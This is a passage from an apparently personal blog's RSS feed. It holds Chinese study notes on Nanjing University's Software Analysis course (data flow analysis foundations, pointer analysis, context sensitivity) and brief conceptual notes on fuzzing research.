      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%85%AD%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
      <description>视频： 南京大学《软件分析》课程 06（Data Flow Analysis - Foundations II 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：(34条消息) 软件分析——数据流分析2_zcc今天好好学习了吗的博客-CSDN博客 (33条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析笔记 PPT： https://cs.nju.edu.cn/tiantan/software-analysis/DFA-FD.pdf
将不动点定理应用于算法 第 5 节课向我们介绍了不动点定理：完全 lattice 且是单调的、有限的，那么存在不动点且从⊤开始迭代找得到最大不动点和从⊥开始迭代找得到最小不动点；现在的问题是：如何关联迭代算法和不动点理论（那么就能证明算法解存在、且最优） 依据不动点定理的条件，我们只需要证明 CFG 是个 complete lattice + 证明转移函数是单调的。
因为每一个 $v_i$ 都是 complete&amp;amp;finite lattices 那么，他们的笛卡尔积得到的 product lattice 也是 complete&amp;amp;finite 的（lattice 的性质） 转移函数有两步：第一步对每个 node 应用转移函数，第二步是进行 join 或 meet 处理。 第一步的转移函数中就是 gen 和 kill 操作，而 gen 和 kill 操作是固定的，结果只能是 0 变成 1 或者 1 变成 1，显然单调。 这里我琢磨了好久，要注意的是这里的转移函数是每次迭代的转移函数，而不是 BBs 之间的转移函数。BBs 之间转移函数的时候是可能将上一个 BB 位向量中的 1 kill 为 0，此时比较的是上一个 BB 和当前 BB 的位向量；但是在迭代层面我们去比较的是当前 BB 在上一次迭代和这次迭代的位向量，因为 gen 和 kill 操作是固定的，结果只能是 0 变成 1 或者 1 变成 1，所以是单调的。 第二步需要分别证明 join 和 meet 是单调的 Meet 证明方法同上 至此，我们将不动点定理与我们的算法联系起来了，迭代算法是可以终止的（到达不动点），并且不动点是最小或者最大不动点 下面来解答第三个问题，算法什么时候达到不动点（复杂度问题）</description>
    </item>
    
    <item>
      <title>南大软件分析第十一节——Pointer Analysis - Context Sensitivity I</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%80%E8%8A%82pointer-analysis-context-sensitivity-i/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%80%E8%8A%82pointer-analysis-context-sensitivity-i/</guid>
      <description>视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记】南大软件分析课程8——指针分析-上下文敏感（课时11/12） - 简书 (jianshu.com) (34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 PPT：Pointer Analysis: Context Sensitivity (nju.edu.cn) 上下文不敏感带来的问题 对于上述这段代码，当我们不考虑上下文去处理第 5、6 行的 id 函数调用的时候，id 的参数和返回值会和两次调用的参数和返回值杂糅在一起，这样假如在进行常量传播的时候，变量 i 就会被分析为 NAC，这是不对的。所以要对函数调用添加上下文，这样去分析第 7 行的时候 get 指向的就只有对象 One 里面的 get 函数
Introduction btw 上下文不敏感的英文是 contex insensitivity，缩写是 C.I. 上下文敏感的英文是 contex sensitivity，缩写是 C.S.
目前 oldest 和 best-know 的上下文敏感策略是 call-site sensitivity（call-string） 使用 call site 链来表示每个方法的上下文（非重点） cloning-based 上下文敏感（最直观的方法去实现上下文敏感）、 每个上下文就会对变量和方法进行一次克隆 上下文敏感的堆 OO 程序是典型的堆敏感，因为程序会频繁的修改堆，所以也要对堆抽象添加上下文
老师在这里进行举例表示上下文敏感和堆的上下文敏感缺一不可
不考虑堆的上下文敏感，只考虑分析的上下文敏感
我们可以看到虽然分析的时候考虑了上下文敏感，但是当调用方法中存在 new 语句的时候 （堆操作），不考虑堆的 C.</description>
    </item>
    
    <item>
      <title>南大软件分析第十三节——Static Analysis for Security</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%89%E8%8A%82static-analysis-for-security/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%B8%89%E8%8A%82static-analysis-for-security/</guid>
      <description>视频：南京大学《软件分析》课程13（Static Analysis for Security）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记】南大软件分析课程9——污点分析（课时13） - 简书 (jianshu.com) (34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 PPT：Static Analysis for Security (nju.edu.cn) 没什么新东西，懒得写笔记了。</description>
    </item>
    
    <item>
      <title>南大软件分析第十二节——Pointer Analysis - Context Sensitivity II</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%8A%82pointer-analysis-context-sensitivity-ii/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%8A%82pointer-analysis-context-sensitivity-ii/</guid>
      <description>视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili 课程主页：Static Program Analysis | Tai-e (pascal-lab.net) 笔记参考：【课程笔记】南大软件分析课程8——指针分析-上下文敏感（课时11/12） - 简书 (jianshu.com) (34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 PPT：Pointer Analysis: Context Sensitivity (nju.edu.cn) 本节讲上下文敏感的过程间指针分析的算法 Context Sensitive Pointer Analysis：Algorithms C.S.和 C.I.的算法本质上没有什么区别，基本上就是把对象、变量前加了上下文的标识 唯一的区别在于 ProcessCall 中添加了 select 方法来找到目标函数 m 的上下文标识。 select 方法的细节在后面详细讲。
Context Sensitivity Variants 上下文的生成主要有三种策略：
call-site sensitivity object sensitivity type sensitivity call-site sensitivity call-site sensitivity 的策略如上图所示，就是在原来上下文链的基础上，把调用点处的上下文加上去。 下图是例子。但是这样的分析策略带来了一个问题，就是图中 15 行，bar 方法内又调用自己，那么这样分析就不会终止，就会生成一个无穷无尽的上下文链。并且在实际分析程序中，即使没有想图中这样的情况，但是因为程序本身就很复杂，生成的上下文链也会很长，这样就会影响分析性能。 所以，call-site sensitivity 设定了上下文链的长度最长为 k，因此它又被称为 k-CFA。 设置了长度限制可以
确保指针分析算法的终止 避免在实际分析中生成过长的上下文链 具体的操作就是对于生成的上下文链，如果长度大于 k，那么就只保留最后 k 个上下文。（在实际分析中，k 通常小于等于 3，并且在函数的上下文通常取2，堆上下文通常取1 的时候效果比较好） 这里老师举了个例子，还是挺绕的，建议去看看视频</description>
    </item>
    
    <item>
      <title>南大软件分析第十节——Pointer Analysis - Foundations II</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E8%8A%82pointer-analysis-foundations-ii/</link>
      <pubDate>Sun, 11 Jun 2023 02:01:58 +0530</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E5%8D%81%E8%8A%82pointer-analysis-foundations-ii/</guid>
      <description>视频：南京大学《软件分析》课程10（Pointer Analysis - Foundations II）哔哩哔哩_bilibili PPT： https://cs.nju.edu.cn/tiantan/software-analysis/PTA-FD.pdf 笔记参考：(34条消息) 【课程笔记】南大软件分析课程—16课时完整版_bsauce的博客-CSDN博客_南京大学软件分析 【课程笔记】南大软件分析课程7——指针分析基础（课时9/10） - 简书 (jianshu.com) 书接上回
指针分析如何处理函数调用 老师再次提及了 CHA 算法的缺陷，CHA 是基于声明类型，所以不精准，可能会引入冗余的调用边和指针关系。
因为声明类型可能是父类，而实例化的实际是个子类，当变量调用子类方法的时候，CHA 分析的时候会将父类的所有子类都纳入变量的指向关系，这样就多了很多实际没有的调用边和指针关系 所以相对于 CHA，基于 pt (a)的指针分析要更加精准，以过程间指针分析和 CG 构造同时进行，动态的去传播和添加指向关系，这样构成的调用图就没有冗余边了。
调用语句规则 概括来说就是四步走
dispatch 来找到方法 k 是到底是哪个函数 传 receiver object（第四行）：把 x 指向的对象 oi（就是第一行的 pt (x)）传入 m 函数的 this 变量 传参数 （第二行和第五行）：把每个参数指向的对象 ou 传给函数 m 的参数，mpj 意思是 m 的第 j 个参数，同时建立 PFG 边 传返回值（第三行和第六行）：pt (mret)传给 pt (r)，同时建立 PFG 边 问题：为什么 PFG 中不添加 x-&amp;gt;mthis 边？此时的 x 指向的那些 oi 和 m 具有相同的对象，所以可以流向 mthis，但是 PFG 是动态构建的，之后 x 可能指向了和 m 不是同一类的对象，那么此时将这些对象流向 mthis 是不对的。</description>
    </item>
    
    <item>
      <title></title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81%E6%9D%A5%E6%8F%90%E9%AB%98alfnet%E7%9A%84%E8%A6%86%E7%9B%96%E7%8E%87/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81%E6%9D%A5%E6%8F%90%E9%AB%98alfnet%E7%9A%84%E8%A6%86%E7%9B%96%E7%8E%87/</guid>
      <description>论文阅读 Fuzzing Error Handling Code using Context-Sensitive Software Fault Injection | USENIX 跟着白泽读论文丨VUzzer:Application-aware Evolutionary Fuzz - 知乎 (zhihu.com) syzkaller 查询Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection作者后续工作 许多基于sfi的方法[39]-[45]针对的是用户级应用。 实验 查看在fuzz过程中没有覆盖的错误处理代码是什么代码 （主要是看看ftpsever是否有和硬件驱动相关的错误处理代码） 想法 识别错误处理代码+定向fuzz 通过故障注入使得错误处理代码执行来提高代码覆盖率 </description>
    </item>
    
    <item>
      <title></title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9/</guid>
      <description>基于生成和基于变异的模糊 从测试用例生成的角度来看，模糊测试技术可分为基于生成的模糊测试技术和基于变异的模糊测试技术。 其中，基于生成的模糊测试技术根据语法或有效语料库从头开始生成输入，就好像从基因到人体的一个成长过程。该技术不进行比特位调度或变异算法调度，而是侧重于从初始规则构造。 基于变异的模糊测试技术对现有的有效果的异常测试用例（称为种子）进行变异，以获得新的测试用例。例如，玉米的基因变异会产生不同形态一样。该技术需要给定一个种子集，执行种子调度、比特位调度和变异算法调度以获得新的测试用例。</description>
    </item>
    
    <item>
      <title>About</title>
      <link>https://examplesite.com/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/about/</guid>
      <description>待写</description>
    </item>
    
    
    <item>
      <title>contact</title>
      <link>https://examplesite.com/contact/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/contact/</guid>
      <description>待写</description>
    </item>
    
    
  </channel>
</rss>
